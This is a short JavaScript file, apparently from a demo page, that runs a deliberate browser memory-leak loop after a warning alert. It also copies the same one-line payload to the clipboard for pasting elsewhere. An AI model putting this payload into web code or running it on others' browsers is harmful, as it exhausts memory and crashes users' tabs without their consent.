function killer() {
    alert("The memory leak will begin when you click OK. To cancel, close the tab.");
    window.reallyFatCanvas = document.createElement('canvas');let context = window.reallyFatCanvas.getContext('2d');function leakingLoop() {context.canvas.width = document.body.clientWidth;context.canvas.height = document.body.clientHeight;const newContext = document.createElement('canvas').getContext('2d');context.context = newContext;context.drawImage(newContext.canvas, 0, 0);context = newContext;}setInterval(leakingLoop,1);
}

function copy() {
    navigator.clipboard.writeText("window.reallyFatCanvas = document.createElement('canvas');let context = window.reallyFatCanvas.getContext('2d');function leakingLoop() {context.canvas.width = document.body.clientWidth;context.canvas.height = document.body.clientHeight;const newContext = document.createElement('canvas').getContext('2d');context.context = newContext;context.drawImage(newContext.canvas, 0, 0);context = newContext;}setInterval(leakingLoop,1);");
    alert("Copied!");
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function openanim() {
    await sleep(500);
    document.getElementById("content").style.height = "35%"
    await sleep(900);
    document.getElementById("content2").style.opacity = 1;
}

openanim();
